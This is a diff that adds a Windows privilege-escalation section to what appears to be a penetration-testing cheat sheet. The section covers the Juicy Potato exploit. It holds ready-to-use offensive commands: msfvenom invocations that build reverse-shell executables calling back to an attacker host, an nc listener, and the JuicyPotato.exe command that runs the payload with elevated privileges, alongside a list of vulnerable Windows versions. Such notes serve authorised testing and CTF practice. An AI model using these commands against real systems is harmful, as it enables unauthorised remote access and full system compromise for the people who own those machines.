@@ -148,4 +148,34 @@ Use listener
 
 <code>nc -lnvp [PORT]</code>
 
+## Windows Privilege Escalation
 
+### Juicy Potato
+
+Found [here](https://github.com/ohpe/juicy-potato) ([pre-compile binaries](https://github.com/ohpe/juicy-potato/releases))
+
+#### Vulnerable OS Versions
+
+- Windows 7 Enterprise
+- Windows 8.1 Enterprise
+- Windows 10 Enterprise
+- Windows 10 Professional
+- Windows Server 2008 R2 Enterprise
+- Windows Server 2012 Datacenter
+- Windows Server 2016 Standard
+
+### Required Permissions
+- <code>SeImpersonate</code>
+- <code>SeAssignPrimaryToken</code>
+
+### Generating the payload
+
+Windows x64: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[LOCAL-IP] LPORT=[PORT] -f exe -o shell.exe</code>
+
+Windows x82: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL-IP] LPORT=[PORT] -f exe -o shell.exe</code>
+
+### Execution
+
+Create the listener to cath the payload then run:
+
+<code>JuicyPotato.exe -l 1337 -p [DIR\TO\EXPLOIT] -t * -c {CLSID}</code>
